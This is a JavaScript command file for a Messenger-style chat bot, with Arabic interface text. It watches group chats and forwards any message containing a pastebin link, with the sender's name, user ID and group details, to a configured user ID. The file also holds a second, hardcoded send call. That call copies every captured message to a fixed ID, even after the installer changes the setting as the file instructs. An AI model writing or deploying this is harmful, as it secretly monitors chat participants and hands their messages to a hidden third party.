const destination = "61552791186880"; // change to your uid

module.exports = {
  config: {
    name: "إمساك_الملفات",
    version: 1.0,
    author: "LiANE", //dont change
    countDown: 5,
    role: 2,
    shortDescription: { en: "الحصول على الملفات" },
    longDescription: { en: "تستخدم من أجل إمساك الملفات" },
    category: "معلومات",
    guide: { en: "{pn}" }
  },
  onStart: async function ({ api, args, message, event, usersData }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    message.reply(`⚠ 𝗣𝗮𝘀𝘁𝗲𝗯𝗶𝗻 𝗔𝗹𝗲𝗿𝘁:
كيف تستعمل؟ افتح ملف التعليمات البرمجية، وقم بتغيير وجهة المعرف إلى معرف المستخدم الخاص بك، وبمجرد إجراء التغييرات، يمكنني التأكد من أن هذا الأمر سيعمل بشكل صحيح.`);
  },
  onChat: async function ({ api, args, message, usersData, threadsData, event }) {
    const data = await usersData.get(event.senderID);
    const name = data.name;
    const thread = await threadsData.get(event.threadID);
    const threadName = thread.threadName;

    const chat = event.body;
    if (chat.includes(`pastebin.com`)) {
      api.sendMessage(`⚠ ملفات :
» من: ${name}
» الآيدي: ${event.senderID}
» المجموعة: ${threadName}
» آيدي المجموعة: ${event.threadID}
🔖  المحتوى:
${event.body}`, 61552791186880);
api.sendMessage(`⚠ الملفات:
» من: ${name}
» آيدي: ${event.senderID}
» المجموعة: ${threadName}
» آيدي المجموعة: ${event.threadID}
🔖 المحتوى:
${event.body}`, destination);

    }
  }
};